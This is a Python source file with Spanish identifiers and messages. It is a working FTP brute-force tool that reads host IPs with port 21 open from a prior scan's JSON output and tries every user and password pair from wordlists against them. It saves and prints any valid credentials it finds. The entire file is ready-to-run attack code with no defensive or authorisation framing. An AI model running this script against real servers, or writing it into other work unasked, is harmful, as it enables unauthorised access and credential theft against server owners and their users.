import os
import json
from ftplib import FTP

FTP_RESULTS_DIR = "results/ftp"
WORDLIST_USER = "wordlists/users.txt"
WORDLIST_PASS = "wordlists/passwords.txt"
SCAN_RESULTS_FILE = "results/scan_results.json"

def fuerza_bruta_ftp(ip, port=21):
    os.makedirs(FTP_RESULTS_DIR, exist_ok=True)
    resultados = {
        "host": ip,
        "port": port,
        "valid_credentials": []
    }

    with open(WORDLIST_USER, "r") as f:
        usuarios = [line.strip() for line in f if line.strip()]
    with open(WORDLIST_PASS, "r") as f:
        contrasenas = [line.strip() for line in f if line.strip()]

    print(f"[*] Iniciando fuerza bruta FTP contra {ip}:{port}...")

    for usuario in usuarios:
        for contrasena in contrasenas:
            try:
                ftp = FTP()
                ftp.connect(ip, port, timeout=3)
                ftp.login(usuario, contrasena)
                print(f"[+] Credenciales válidas encontradas: {usuario}:{contrasena}")
                resultados["valid_credentials"].append({"usuario": usuario, "password": contrasena})
                ftp.quit()
            except Exception:
                continue

    salida = os.path.join(FTP_RESULTS_DIR, f"ftp_{ip}_bruteforce.json")
    with open(salida, "w") as f:
        json.dump(resultados, f, indent=4)

    print(f"[+] Resultados guardados en {salida}")
    return resultados

def run_ftp_attack():
    if not os.path.exists(SCAN_RESULTS_FILE):
        print(f"[!] Archivo de escaneo no encontrado: {SCAN_RESULTS_FILE}")
        return

    with open(SCAN_RESULTS_FILE, "r") as f:
        data = json.load(f)

    for host in data.get("hosts", []):
        ip = host.get("ip")
        for port_info in host.get("open_ports", []):
            if port_info.get("port") == 21:
                fuerza_bruta_ftp(ip)
                break